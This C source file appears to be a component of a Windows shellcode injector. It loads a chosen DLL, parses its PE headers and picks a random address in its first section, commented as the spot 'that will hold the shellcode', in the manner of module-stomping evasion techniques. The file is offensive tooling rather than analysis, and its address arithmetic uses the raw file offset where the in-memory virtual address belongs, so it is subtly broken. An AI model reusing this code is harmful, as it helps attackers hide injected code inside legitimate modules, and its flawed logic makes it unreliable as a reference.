#include "commun.h"

#define MIN_GAP 20000  // minimum gap between two random offsets


DWORD prevOffset = 0;


// get a random offset in RX region witha MIN_GAP difference between 2 different offsets
DWORD get_random_offset(DWORD maxOffset) {

	DWORD newOffset = rand() % maxOffset;

	while ((newOffset > prevOffset ? newOffset - prevOffset : prevOffset - newOffset) < MIN_GAP) {
		newOffset = rand() % maxOffset;
	}

	prevOffset = newOffset;
	return newOffset;
}


// GET random RX spot inside the submited module .text section
// that will hold the shellcode

LPVOID getRandomRXspot(const char* moduleName, DWORD shellcodeLen) {
	
	LPVOID RXspot = NULL;

	PVOID mdlBaseAddr = LoadLibraryA(moduleName);
	IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)mdlBaseAddr;
	IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)mdlBaseAddr + DOS_HEADER->e_lfanew);
	IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);

	LPVOID txtSectionBase = (LPVOID)((DWORD64)mdlBaseAddr + (DWORD64)SECTION_HEADER->PointerToRawData);
	DWORD txtSectionSize = SECTION_HEADER->SizeOfRawData;

	printf("[+] %s's %s\t%p\t%d bytes\n", moduleName, SECTION_HEADER->Name,
		(LPVOID)((DWORD64)mdlBaseAddr + (DWORD64)SECTION_HEADER->PointerToRawData),
		txtSectionSize);

	if (txtSectionSize < shellcodeLen) {
		printf("[-] Choose Another Module with a large \".text\" section\n");
		return NULL;
	}
	
	// Initialize random seed
	srand((unsigned)time(NULL));

	DWORD randomOffset = get_random_offset(txtSectionSize - shellcodeLen);
	printf("[+] randomOffset %d\n", randomOffset);

	RXspot = (LPVOID)((DWORD64)txtSectionBase + randomOffset);

	return RXspot;
}
